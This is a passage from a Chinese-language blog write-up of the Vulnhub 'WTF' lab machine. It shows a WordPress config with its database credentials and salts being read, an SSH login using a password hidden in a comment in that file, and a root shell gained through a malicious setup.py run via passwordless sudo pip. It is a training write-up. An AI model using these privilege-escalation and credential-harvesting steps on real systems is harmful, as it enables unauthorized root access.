class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br></pre></td></tr></table></figure>
+
+<p>sudo -l又需要输入密码</p>
+<p>进入&#x2F;var&#x2F;www&#x2F;html&#x2F;zhkh目录查看wp-config.php文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">www-data@wtf:/var/www/html/zhkh$ <span class="built_in">cat</span> wp-config.php</span><br><span class="line"><span class="built_in">cat</span> wp-config.php</span><br><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * The base configuration <span class="keyword">for</span> WordPress</span><br><span class="line"> *</span><br><span class="line"> * The wp-config.php creation script uses this file during the</span><br><span class="line"> * installation. You don<span class="string">&#x27;t have to use the web site, you can</span></span><br><span class="line"><span class="string"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * This file contains the following configurations:</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * * MySQL settings</span></span><br><span class="line"><span class="string"> * * Secret keys</span></span><br><span class="line"><span class="string"> * * Database table prefix</span></span><br><span class="line"><span class="string"> * * ABSPATH</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @link https://codex.wordpress.org/Editing_wp-config.php</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @package WordPress</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="string">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_NAME<span class="string">&#x27;, &#x27;</span>wp_database<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL database username */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_USER<span class="string">&#x27;, &#x27;</span>ra<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL database password */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_PASSWORD<span class="string">&#x27;, &#x27;</span>912391929129<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL hostname */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_HOST<span class="string">&#x27;, &#x27;</span>localhost<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Database Charset to use in creating database tables. */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_CHARSET<span class="string">&#x27;, &#x27;</span>utf8mb4<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** The Database Collate type. Don&#x27;</span>t change this <span class="keyword">if</span> <span class="keyword">in</span> doubt. */</span><br><span class="line">define( <span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/**<span class="comment">#@+</span></span><br><span class="line"> * Authentication Unique Keys and Salts.</span><br><span class="line"> *</span><br><span class="line"> * Change these to different unique phrases!</span><br><span class="line"> * You can generate these using the &#123;@<span class="built_in">link</span> https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span><br><span class="line"> * You can change these at any point <span class="keyword">in</span> time to invalidate all existing cookies. This will force all <span class="built_in">users</span> to have to <span class="built_in">log</span> <span class="keyword">in</span> again.</span><br><span class="line"> *</span><br><span class="line"> * @since 2.6.0</span><br><span class="line"> */</span><br><span class="line">define( <span class="string">&#x27;AUTH_KEY&#x27;</span>,         <span class="string">&#x27;hmdNSrpLV5we) E$0_/E,$Vxr0%&lt;S&#123;]D@)T+rc%a7wvbr)Q|bm7boJdOz/AN&gt;/#&amp;&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="string">&#x27;DR&amp;l3&gt;0z8mmFT+Y&#125;#bqND_~H;wb[r|:te+tN%:K PS7=~~/;uA5)zj~Z%tu&#125;-8UJ&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="string">&#x27;7+cns%lA?p60U~*(J,z9zp4w 2%hB1S6jZ0NuUgl(oK,#H6&amp;GL,i@+4m:1w3|-aW&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;NONCE_KEY&#x27;</span>,        <span class="string">&#x27;m5,d=I4 MShd4lU#8F@@oj2cKpc+J[Kp3bRt%Sfuw.%#`oVKzgDMTl5+D[nu,R&lt;K&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;AUTH_SALT&#x27;</span>,        <span class="string">&#x27;sl3w_.&#125;n|M&#123;~D#6,v]U?Kz/,k&amp;oCnn1._|(i3Y|ng7+&lt;-f4Nv7mmR4B&lt;i&gt;!?du#i&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="string">&#x27;b&gt;,[La8I5xqchTMvXN-bI8%[)-V[wHjNmj/1jZ_Vnq`q0&lt;|E@6^.8~KpI_#53Rw_&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="string">&#x27;v_`E=EA]$UBa.2P|%YV4cl&#125;(c@AVkW$V5959/gQL~a:,O&#125;qfG85Xc4)=xRBux6g?&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;NONCE_SALT&#x27;</span>,       <span class="string">&#x27;TE#Tim,4h|zKYm$he[F%J*4vG&#123;v]VK!jP0sSeBLHp7Mp|P*XJz:=&amp;n&lt;nsfbIFq&gt;a&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/**<span class="comment">#@-*/</span></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * WordPress Database Table prefix.</span><br><span class="line"> *</span><br><span class="line"> * You can have multiple installations <span class="keyword">in</span> one database <span class="keyword">if</span> you give each</span><br><span class="line"> * a unique prefix. Only numbers, letters, and underscores please!</span><br><span class="line"> */</span><br><span class="line"><span class="variable">$table_prefix</span> = <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * For developers: WordPress debugging mode.</span><br><span class="line"> *</span><br><span class="line"> * Change this to <span class="literal">true</span> to <span class="built_in">enable</span> the display of notices during development.</span><br><span class="line"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span><br><span class="line"> * <span class="keyword">in</span> their development environments.</span><br><span class="line"> *</span><br><span class="line"> * For information on other constants that can be used <span class="keyword">for</span> debugging,</span><br><span class="line"> * visit the Codex.</span><br><span class="line"> *</span><br><span class="line"> * @<span class="built_in">link</span> https://codex.wordpress.org/Debugging_in_WordPress</span><br><span class="line"> */</span><br><span class="line">define( <span class="string">&#x27;WP_DEBUG&#x27;</span>, <span class="literal">false</span> );</span><br><span class="line"></span><br><span class="line">/* That<span class="string">&#x27;s all, stop editing! Happy publishing. */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Absolute path to the WordPress directory. */</span></span><br><span class="line"><span class="string">if ( ! defined( &#x27;</span>ABSPATH<span class="string">&#x27; ) ) &#123;</span></span><br><span class="line"><span class="string">        define( &#x27;</span>ABSPATH<span class="string">&#x27;, dirname( __FILE__ ) . &#x27;</span>/<span class="string">&#x27; );</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Sets up WordPress vars and included files. */</span></span><br><span class="line"><span class="string">require_once( ABSPATH . &#x27;</span>wp-settings.php<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//`Db]f&#123;He3HgO`(z</span></span><br></pre></td></tr></table></figure>
+
+<p>将其中的ra&#x2F;912391929129连接ssh发现连接不上，再将ra&#x2F;<code>Db]f&#123;He3HgO</code>(z连接ssh，成功登录，真想说一句what the fuck!!!!!!</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh ra@192.168.1.15</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.1.15 (192.168.1.15)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:YRICww0bKH3fcEIycw4x9iWEv3gF1qtqElE7ecocCn8.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.1.15<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">ra@192.168.1.15&#x27;</span>s password: </span><br><span class="line">Linux wtf 4.19.0-6-amd64 <span class="comment">#1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Thu Nov 21 12:47:56 2019 from 192.168.1.13</span><br><span class="line">ra@wtf:~$ <span class="built_in">ls</span></span><br><span class="line">ra@wtf:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(ra) gid=1000(ra) <span class="built_in">groups</span>=1000(ra),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)</span><br><span class="line">ra@wtf:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/ra</span><br><span class="line">ra@wtf:~$ <span class="built_in">whoami</span></span><br><span class="line">ra</span><br><span class="line">ra@wtf:~$ <span class="built_in">ls</span> -la</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x 3 ra   ra   4096 Nov 21 15:04 .</span><br><span class="line">drwxr-xr-x 3 root root 4096 Nov 21 06:45 ..</span><br><span class="line">-rw------- 1 ra   ra    480 Nov 21 15:01 .bash_history</span><br><span class="line">-rw-r--r-- 1 ra   ra    220 Nov 21 06:45 .bash_logout</span><br><span class="line">-rw-r--r-- 1 ra   ra   3526 Nov 21 06:45 .bashrc</span><br><span class="line">drwx------ 3 ra   ra   4096 Nov 21 14:18 .gnupg</span><br><span class="line">-rw-r--r-- 1 ra   ra    807 Nov 21 06:45 .profile</span><br><span class="line">ra@wtf:~$</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ra@wtf:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> ra on wtf:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User ra may run the following commands on wtf:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/pip</span><br></pre></td></tr></table></figure>
+
+<p>发现&#x2F;usr&#x2F;bin&#x2F;pip可以以root用户的权限执行，网上搜索利用方法，传送门<span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8v">GTFOBins<i class="fa fa-external-link-alt"></i></span></p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub93.jpg"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ra@wtf:~$ TF=$(<span class="built_in">mktemp</span> -d)</span><br><span class="line">ra@wtf:~$ <span class="built_in">echo</span> <span class="string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;<span class="subst">$(tty)</span> &gt;<span class="subst">$(tty)</span> 2&gt;<span class="subst">$(tty)</span>&#x27;)&quot;</span> &gt; <span class="variable">$TF</span>/setup.py</span><br><span class="line">ra@wtf:~$ sudo pip install <span class="variable">$TF</span></span><br><span class="line">Processing /tmp/tmp.FbYhS1oIjc</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># </span></span><br></pre></td></tr></table></figure>
+
+<p>运行poc后成功提权,然后找到flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line"><span class="comment"># cat flag.txt</span></span><br><span class="line">WTF rooted!</span><br><span class="line">haha, well <span class="keyword">done</span>. </span><br><span class="line">You can find me on discord to tell me your opinion about <span class="string">&quot;WTF&quot;</span> -&gt; pwn4magic<span class="comment">#8707</span></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>帅的掉渣</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub94.jpg"></p>
+<p><font color="red">Game over</font></p>
+<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
+<p><font color="green"><em><strong>The end,to be continue…</strong></em></font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2019/12/24/WTF-1/" title="vulnhub靶机渗透[WTF-1]">https://fdlucifer.github.io/2019/12/24/WTF-1/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> vulnhub靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2019/12/22/hackNos-Os-hackNos-1/" rel="prev" title="vulnhub靶机渗透[hackNos-Os-hackNos-1]">
+                  <i class="fa fa-chevron-left"></i> vulnhub靶机渗透[hackNos-Os-hackNos-1]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2019/12/24/sunset-sunrise/" rel="next" title="vulnhub靶机渗透[sunset-sunrise]">
+                  vulnhub靶机渗透[sunset-sunrise] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
